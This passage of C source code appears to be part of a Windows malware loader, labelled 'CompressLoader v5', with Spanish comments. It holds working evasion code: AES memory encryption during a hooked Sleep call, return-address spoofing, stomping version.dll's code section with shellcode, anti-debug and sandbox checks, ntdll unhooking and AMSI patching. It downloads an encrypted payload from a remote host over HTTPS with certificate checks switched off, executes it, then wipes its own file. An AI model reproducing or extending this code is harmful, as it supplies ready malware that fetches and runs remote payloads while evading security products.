    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) { CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return; }
    CryptSetKeyParam(hKey, KP_IV, ctx->iv, 0);
    DWORD dataLen = (DWORD)ctx->textSize;
    if (CryptEncrypt(hKey, 0, TRUE, 0, (BYTE*)ctx->textStart, &dataLen, (DWORD)ctx->textSize)) {
        if (g_fluctMode == 2) {
            VirtualProtect(ctx->textStart, ctx->textSize, PAGE_NOACCESS, &old);
        } else {
            VirtualProtect(ctx->textStart, ctx->textSize, PAGE_READWRITE, &old);
        }
        ctx->encrypted = TRUE;
    }
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}

void FluctuateDecrypt(FLUCTUATION_CTX* ctx) {
    if (!ctx->textStart || ctx->textSize == 0 || !ctx->encrypted) return;
    DWORD old;
    VirtualProtect(ctx->textStart, ctx->textSize, PAGE_READWRITE, &old);
    HCRYPTPROV hProv; HCRYPTHASH hHash; HCRYPTKEY hKey;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) { CryptReleaseContext(hProv, 0); return; }
    if (!CryptHashData(hHash, ctx->key, sizeof(ctx->key), 0)) { CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return; }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) { CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return; }
    CryptSetKeyParam(hKey, KP_IV, ctx->iv, 0);
    DWORD dataLen = (DWORD)ctx->textSize;
    if (CryptDecrypt(hKey, 0, TRUE, 0, (BYTE*)ctx->textStart, &dataLen)) {
        VirtualProtect(ctx->textStart, ctx->textSize, ctx->protect, &old);
        ctx->encrypted = FALSE;
    }
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}

// Hook de Sleep
typedef void (WINAPI *typeSleep)(DWORD ms);
static BYTE sleepStub[16];

typedef struct {
    BYTE* originalBytes;
    DWORD originalBytesSize;
    BYTE* previousBytes;
    DWORD previousBytesSize;
} HookTrampolineBuffers;

bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b) {
    BYTE trampo64[] = { 0x49, 0xBA, 0, 0, 0, 0, 0, 0, 0, 0, 0x41, 0xFF, 0xE2 };
    BYTE *code = trampo64;
    DWORD size = sizeof(trampo64);
    memcpy(code + 2, &jump, 8);
    DWORD old;
    if (!VirtualProtect(target, size, PAGE_EXECUTE_READWRITE, &old))
        return false;
    if (install) {
        if (b && b->previousBytes) {
            memcpy(b->previousBytes, target, size);
            b->previousBytesSize = size;
        }
        memcpy(target, code, size);
    } else {
        if (!b || !b->originalBytes) return false;
        memcpy(target, b->originalBytes, b->originalBytesSize);
        size = b->originalBytesSize;
    }
    NtFlushInstructionCache_indirect(GetCurrentProcess(), target, size);
    VirtualProtect(target, size, old, &old);
    return true;
}

void WINAPI MySleep(DWORD ms) {
    if (g_fluct.textStart && !g_fluct.encrypted)
        FluctuateEncrypt(&g_fluct);
    HookTrampolineBuffers b = {0};
    b.originalBytes = sleepStub;
    b.originalBytesSize = sizeof(sleepStub);
    fastTrampoline(false, (BYTE*)Sleep, (LPVOID)MySleep, &b);
    Sleep(ms);
    fastTrampoline(true, (BYTE*)Sleep, (LPVOID)MySleep, NULL);
    if (g_fluct.textStart && g_fluct.encrypted)
        FluctuateDecrypt(&g_fluct);
}

// Stack spoofing
ULONG_PTR GetSpoofedReturnAddress() {
    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
    if (!hKernel) return 0;
    return (ULONG_PTR)GetProcAddress(hKernel, "LoadLibraryA") + 0x10;
}

void ExecuteWithSpoofedRet(PVOID entry) {
    ULONG_PTR spoofRet = GetSpoofedReturnAddress();
    if (!spoofRet) {
        ((void(*)())entry)();
        return;
    }
    __asm__ volatile(
        "pushq %0\n"
        "jmp *%1\n"
        : : "r"(spoofRet), "r"(entry) : "memory"
    );
}

VOID CALLBACK TimerExecCallback(PVOID lpParam, BOOLEAN TimerOrWaitFired) {
    EXEC_CTX* ctx = (EXEC_CTX*)lpParam;
    // Jitter usando una mezcla de rand() y GetTickCount para mayor entropía
    DWORD jitter = (rand() % 401) + 100;
    Sleep(jitter);
    ExecuteWithSpoofedRet(ctx->entry);
}

BOOL ModuleStompAndExecute(PVOID shellcode, SIZE_T shellcodeSize, int fluctMode) {
    HMODULE hMod = LoadLibraryA("version.dll");
    if (!hMod) return FALSE;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hMod + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            PVOID textAddr = (PBYTE)hMod + sec[i].VirtualAddress;
            SIZE_T textSize = sec[i].Misc.VirtualSize;
            if (shellcodeSize > textSize) {
                // Fallback a memoria privada
                PVOID execMem = NULL;
                SIZE_T regionSize = shellcodeSize;
                NTSTATUS status = NtAllocateVirtualMemory_indirect(GetCurrentProcess(), &execMem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (!NT_SUCCESS(status)) return FALSE;
                memcpy(execMem, shellcode, shellcodeSize);
                DWORD old;
                VirtualProtect(execMem, shellcodeSize, PAGE_EXECUTE_READ, &old);
                if (fluctMode != 0) {
                    g_fluct.textStart = execMem;
                    g_fluct.textSize = shellcodeSize;
                    g_fluct.protect = PAGE_EXECUTE_READ;
                    g_fluct.encrypted = FALSE;
                    g_fluctMode = fluctMode;
                    HCRYPTPROV hProv;
                    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
                        CryptGenRandom(hProv, sizeof(g_fluct.key), g_fluct.key);
                        CryptGenRandom(hProv, sizeof(g_fluct.iv), g_fluct.iv);
                        CryptReleaseContext(hProv, 0);
                    }
                    memcpy(sleepStub, (void*)Sleep, sizeof(sleepStub));
                    fastTrampoline(true, (BYTE*)Sleep, (LPVOID)MySleep, NULL);
                }
                HANDLE hTimerQueue = CreateTimerQueue();
                if (!hTimerQueue) {
                    ((void(*)())execMem)();
                    return TRUE;
                }
                HANDLE hTimer;
                EXEC_CTX ctx = { execMem };
                if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, TimerExecCallback, &ctx, 0, 0, WT_EXECUTEDEFAULT)) {
                    DeleteTimerQueueEx(hTimerQueue, NULL);
                    ((void(*)())execMem)();
                    return TRUE;
                }
                Sleep(INFINITE);
                return TRUE;
            }
            // Stomp .text
            DWORD oldProtect;
            VirtualProtect(textAddr, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(textAddr, shellcode, shellcodeSize);
            if (shellcodeSize < textSize)
                memset((PBYTE)textAddr + shellcodeSize, 0x90, textSize - shellcodeSize);
            VirtualProtect(textAddr, textSize, PAGE_EXECUTE_READ, &oldProtect);
            NtFlushInstructionCache_indirect(GetCurrentProcess(), textAddr, textSize);
            if (fluctMode != 0) {
                g_fluct.textStart = textAddr;
                g_fluct.textSize = textSize;
                g_fluct.protect = PAGE_EXECUTE_READ;
                g_fluct.encrypted = FALSE;
                g_fluctMode = fluctMode;
                HCRYPTPROV hProv;
                if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
                    CryptGenRandom(hProv, sizeof(g_fluct.key), g_fluct.key);
                    CryptGenRandom(hProv, sizeof(g_fluct.iv), g_fluct.iv);
                    CryptReleaseContext(hProv, 0);
                }
                memcpy(sleepStub, (void*)Sleep, sizeof(sleepStub));
                fastTrampoline(true, (BYTE*)Sleep, (LPVOID)MySleep, NULL);
            }
            HANDLE hTimerQueue = CreateTimerQueue();
            if (!hTimerQueue) {
                ((void(*)())textAddr)();
                return TRUE;
            }
            HANDLE hTimer;
            EXEC_CTX ctx = { textAddr };
            if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, TimerExecCallback, &ctx, 0, 0, WT_EXECUTEDEFAULT)) {
                DeleteTimerQueueEx(hTimerQueue, NULL);
                ((void(*)())textAddr)();
                return TRUE;
            }
            Sleep(INFINITE);
            return TRUE;
        }
    }
    return FALSE;
}

// ========================================================================
// 11. NETWORK DOWNLOAD
// ========================================================================
typedef struct {
    BYTE* data;
    size_t len;
} DATA;

DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource, wchar_t* userAgent) {
    DATA data = {0};
    unsigned char* buffer = NULL;
    size_t buffer_capacity = 0;
    size_t buffer_size = 0;
    wchar_t defaultUA[] = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
    wchar_t* pUA = userAgent ? userAgent : defaultUA;
    HINTERNET hSession = WinHttpOpen(pUA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return data;
    HINTERNET hConnect = WinHttpConnect(hSession, whost, (USHORT)port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return data; }
    BOOL is_https = (port == 443);
    DWORD flags = is_https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wresource, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return data; }
    if (is_https) {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                          SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
    }
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
        goto cleanup;
    if (!WinHttpReceiveResponse(hRequest, NULL))
        goto cleanup;
    DWORD dwSize = 0;
    while (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize > 0) {
        BYTE* pszOutBuffer = (BYTE*)malloc(dwSize);
        if (!pszOutBuffer) break;
        DWORD dwDownloaded = 0;
        if (!WinHttpReadData(hRequest, pszOutBuffer, dwSize, &dwDownloaded)) {
            free(pszOutBuffer);
            break;
        }
        if (buffer_size + dwDownloaded > buffer_capacity) {
            size_t new_cap = (buffer_size + dwDownloaded) * 2;
            unsigned char* tmp = (unsigned char*)realloc(buffer, new_cap);
            if (!tmp) { free(pszOutBuffer); break; }
            buffer = tmp;
            buffer_capacity = new_cap;
        }
        memcpy(buffer + buffer_size, pszOutBuffer, dwDownloaded);
        buffer_size += dwDownloaded;
        free(pszOutBuffer);
        dwSize = 0;
    }
    if (buffer_size > 0) {
        data.data = malloc(buffer_size);
        if (data.data) { memcpy(data.data, buffer, buffer_size); data.len = buffer_size; }
        free(buffer);
    }
cleanup:
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return data;
}

// ========================================================================
// 12. SELF-DESTRUCT
// ========================================================================
void SelfDestruct() {
    char exePath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) return;
    HANDLE hFile = CreateFileA(exePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD fileSize = GetFileSize(hFile, NULL);
        BYTE* zeros = (BYTE*)calloc(fileSize, 1);
        if (zeros) {
            DWORD written;
            WriteFile(hFile, zeros, fileSize, &written, NULL);
            free(zeros);
        }
        SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
        SetEndOfFile(hFile);
        CloseHandle(hFile);
    }
    MoveFileExA(exePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    DEBUG_PRINT("Autodestrucción completada");
    ExitProcess(0);
}

// ========================================================================
// 13. MAIN
// ========================================================================
int main(int argc, char** argv) {
    // Inicializar generador aleatorio con alta entropía
    srand((unsigned int)(GetTickCount() ^ (GetTickCount() << 16) ^ (GetCurrentProcessId())));
    // Mezclar con QueryPerformanceCounter para mejor semilla
    LARGE_INTEGER perf;
    QueryPerformanceCounter(&perf);
    srand(rand() ^ (unsigned int)perf.QuadPart);

    // Anti-analysis
    if (IsDebuggerPresentEx() || HasHWBreakpoints() || IsSandbox())
        return 1;

    DEBUG_PRINT("Iniciando CompressLoader v5 (modo debug)");

    MasqueradeCmdline();

    LPVOID cleanNtdll = getCleanNtdllViaKnownDlls();
    if (cleanNtdll) {
        UnhookNtdll(cleanNtdll);
        free(cleanNtdll);
    }

    PatchAmsiViaStomping();

    if (argc < 4) return 1;
    char* host = argv[1];
    DWORD port = atoi(argv[2]);
    char* resource = argv[3];
    int fluctMode = (argc >= 5) ? atoi(argv[4]) : 2;
    if (fluctMode < 0 || fluctMode > 2) fluctMode = 2;

    wchar_t* userAgent = NULL;
    if (argc >= 6) {
        int len = MultiByteToWideChar(CP_UTF8, 0, argv[5], -1, NULL, 0);
        userAgent = (wchar_t*)malloc(len * sizeof(wchar_t));
        if (userAgent) MultiByteToWideChar(CP_UTF8, 0, argv[5], -1, userAgent, len);
    }

    DEBUG_PRINT("Descargando payload desde %s:%d/%s", host, port, resource);

    int lenHost = MultiByteToWideChar(CP_UTF8, 0, host, -1, NULL, 0);
    wchar_t* whost = (wchar_t*)malloc(lenHost * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, host, -1, whost, lenHost);
    int lenRes = MultiByteToWideChar(CP_UTF8, 0, resource, -1, NULL, 0);
    wchar_t* wresource = (wchar_t*)malloc(lenRes * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, resource, -1, wresource, lenRes);

    DATA payload = GetData(whost, port, wresource, userAgent);
    free(whost); free(wresource);
    if (userAgent) free(userAgent);
    if (!payload.data || payload.len < 12) {
        if (payload.data) free(payload.data);
        return 1;
    }

    DWORD keyLen = *(DWORD*)payload.data;
    if (keyLen == 0 || keyLen > 1024 || 4 + keyLen + 8 > payload.len) {
        free(payload.data);
        return 1;
    }
    char* key = (char*)payload.data + 4;
    DWORD peOriginalSize = *(DWORD*)(payload.data + 4 + keyLen);
    DWORD cipherLen = *(DWORD*)(payload.data + 4 + keyLen + 4);
    if (4 + keyLen + 8 + cipherLen != payload.len) {
        free(payload.data);
        return 1;
    }
    char* cipher = (char*)payload.data + 4 + keyLen + 8;

    DWORD decryptedLen = cipherLen;
    DecryptAES(cipher, &decryptedLen, key, keyLen);
    DEBUG_PRINT("AES descifrado: %d bytes", decryptedLen);

    unsigned char* decompressed = NULL;
    size_t decompSize = 0;
    if (!decompress_payload((unsigned char*)cipher, decryptedLen, &decompressed, &decompSize)) {
        free(payload.data);
        return 1;
    }
    free(payload.data);
    DEBUG_PRINT("Payload descomprimido: %zu bytes", decompSize);

    BOOL success = ModuleStompAndExecute(decompressed, decompSize, fluctMode);
    free(decompressed);

    SelfDestruct();
    return success ? 0 : 1;
}